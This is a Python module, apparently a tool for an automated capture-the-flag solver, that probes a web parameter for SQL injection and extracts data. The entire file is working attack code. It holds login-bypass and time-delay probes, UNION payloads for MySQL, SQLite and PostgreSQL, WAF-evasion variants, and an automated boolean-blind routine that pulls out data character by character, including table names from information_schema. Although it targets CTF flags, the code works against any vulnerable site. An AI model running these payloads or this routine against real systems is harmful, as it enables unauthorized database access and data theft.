"""SQL 注入检测与利用 Skill：自动探测注入点并提取 flag。

适用场景：登录框/搜索框/参数ID存在 SQL 注入，需绕过 WAF 提取数据。
输入：target_url + param_name
输出：flag 或表的行数据
"""
import re
import urllib.parse

try:
    import httpx
except ImportError:
    httpx = None


PROBES = [
    # 万能密码
    ("' OR '1'='1' -- ", "admin"),
    ("' OR 1=1 -- ", "admin"),
    ("admin' -- ", "admin"),
    ("admin' #", "admin"),
    # 报错注入
    ("' AND 1=1 -- ", "1 OR 1=1"),
    ("' AND 1=2 -- ", "1 OR 1=2"),
    ("' UNION SELECT 1,2,3 -- ", "1 OR 1=1"),
    # 时间盲注
    ("' AND SLEEP(3) -- ", "1"),
    ("' WAITFOR DELAY '0:0:3' -- ", "1"),
    # 字符串拼接
    ("' OR 'a'='a' -- ", "a"),
    ("1' OR 'a'='a' -- ", "1"),
]

UNION_PAYLOADS = [
    # MySQL
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- ",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flag' -- ",
    "' UNION SELECT 1,flag,3 FROM flag -- ",
    "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() #",
    # SQLite
    "' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table' -- ",
    "' UNION SELECT 1,flag,3 FROM secret -- ",
    "' UNION SELECT 1,flag,3 FROM flag -- ",
    # PostgreSQL
    "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='public' -- ",
    "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='flag' -- ",
    "' UNION SELECT 1,flag,3 FROM flag -- ",
    # 绕过 WAF
    "'/**/UNION/**/SELECT/**/1,flag,3/**/FROM/**/flag-- ",
    "' UniOn SeLeCt 1,flag,3 FrOm flag -- ",
    "' UNION SELECT 0x31,flag,0x33 FROM flag -- ",
]


def _send(url, param, payload, method="GET"):
    if httpx is None:
        return ""
    try:
        encoded = urllib.parse.quote(payload)
        if method.upper() == "GET":
            resp = httpx.get(url, params={param: payload}, timeout=10, follow_redirects=True)
        else:
            resp = httpx.post(url, data={param: payload}, timeout=10, follow_redirects=True)
        return resp.text
    except Exception:
        return ""


def make_boolean_oracle(url, param, method="GET", inject_template="' AND {cond} -- "):
    """构造布尔盲注 oracle：通过响应长度差异判定条件真假（确定性二分的基础）。

    inject_template 含 {cond} 占位符（默认 MySQL 布尔型注入位），调用方可按
    WAF 场景改写（如 "1' AND {cond}-- " / "' AND {cond}#"）。

    差异判定：恒真(1=1)与恒假(1=2)响应长度差>0 才判定为可利用的盲注点；
    否则返回 None（长度无差异时盲注不可用，避免误判）。
    """
    true_text = _send(url, param, inject_template.format(cond="1=1"), method)
    false_text = _send(url, param, inject_template.format(cond="1=2"), method)
    if not true_text or abs(len(true_text) - len(false_text)) < 2:
        return None

    def oracle(cond: str) -> bool:
        text = _send(url, param, inject_template.format(cond=cond), method)
        if not text:
            return False
        # 长度贴近恒真基线即判真
        return abs(len(text) - len(true_text)) <= abs(len(text) - len(false_text))
    return oracle


def bool_blind_extract(oracle, subquery: str = "flag", start: int = 1, end: int = 64) -> str:
    """确定性布尔盲注逐字符提取（二分法）。

    参数:
        oracle: callable(condition_sql: str) -> bool——条件为真返回 True
                （由 make_boolean_oracle 或调用方自定义注入）。
        subquery: 要提取的子查询（如 flag 列/表名，默认 'flag'）。
        start/end: 提取位置范围（默认 1..64）。

    返回:
        提取出的字符串（未命中时返回已提取部分）。
    确定性：命中即逐字符二分秒出，WAF 场景（UNION 被拦）下唯一可靠手段。
    """
    result = ""
    for i in range(start, end + 1):
        lo, hi = 0, 255
        while lo <= hi:
            mid = (lo + hi) // 2
            cond = f"ascii(substr((select {subquery}),{i},1))>{mid}"
            try:
                is_true = bool(oracle(cond))
            except Exception:  # noqa: BLE001
                return result
            if is_true:
                lo = mid + 1
            else:
                hi = mid - 1
        if lo == 0:
            return result  # 该位置无内容（结尾）
        result += chr(lo)
        if result.endswith("}") and result.count("}") > 0 and result.startswith(("flag", "DASCTF")):
            break
    return result


def run(target_url: str = "", param_name: str = "username", method: str = "POST", **kwargs) -> dict:
    results = {"flag": "", "evidence": "", "injectable": False}

    target_url = target_url or kwargs.get("url", "")
    param_name = param_name or kwargs.get("param", "username")

    if not target_url:
        results["evidence"] = "缺少 target_url 参数"
        return results

    first_text = _send(target_url, param_name, "test", method)

    # 阶段 1：探测注入点
    flag_pattern = re.compile(r"(?:flag|DASCTF)\{[^}]+\}")

    for probe, _ in PROBES:
        text = _send(target_url, param_name, probe, method)
        if not text:
            continue
        # 检测 flag
        flag_match = flag_pattern.search(text)
        if flag_match:
            results["flag"] = flag_match.group(0)
            results["evidence"] = f"万能密码成功: {probe[:50]}"
            results["injectable"] = True
            return results
        # 检测是否与原始响应不同（注入成功）
        if text != first_text and len(text) > 0:
            results["injectable"] = True
            results["evidence"] = f"注入点确认: {probe[:50]}"
            break

    # 阶段 2：UNION 注入提取数据
    if results["injectable"]:
        for payload in UNION_PAYLOADS:
            text = _send(target_url, param_name, payload, method)
            if not text:
                continue
            flag_match = flag_pattern.search(text)
            if flag_match:
                results["flag"] = flag_match.group(0)
                results["evidence"] += f"\nUNION 注入成功: {payload[:60]}"
                return results

    # 阶段 2.5：布尔盲注（UNION 被 WAF 拦截时的确定性兜底——逐字符二分）
    if results["injectable"] and not results["flag"]:
        try:
            oracle = make_boolean_oracle(target_url, param_name, method)
            if oracle:
                extracted = bool_blind_extract(oracle, subquery="flag")
                if extracted and flag_pattern.search(extracted):
                    results["flag"] = flag_pattern.search(extracted).group(0)
                    results["evidence"] += f"\n布尔盲注提取成功: {extracted[:60]}"
                elif extracted:
                    results["evidence"] += f"\n布尔盲注提取(未确认flag): {extracted[:60]}"
                # 表名探测：UNION 有回显但列名非 flag 时提取 information_schema 表名
                if not results["flag"]:
                    tables = bool_blind_extract(
                        oracle,
                        subquery="table_name from information_schema.tables where table_schema=database() limit 0,1")
                    if tables:
                        results["evidence"] += f"\n首表名(布尔盲注): {tables[:60]}"
        except Exception:  # noqa: BLE001
            pass

    if not results["injectable"]:
        results["evidence"] = "未检测到 SQL 注入"
    return results